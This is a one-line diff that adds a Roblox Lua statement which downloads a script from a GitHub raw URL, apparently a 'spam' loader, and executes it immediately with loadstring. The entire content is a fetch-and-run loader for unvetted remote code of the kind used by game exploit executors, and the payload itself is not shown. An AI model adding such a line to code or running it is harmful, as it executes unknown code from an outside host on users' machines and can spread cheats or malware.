@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/mitosis-spam3-8xv4zvwdmjigsq.lua"))()
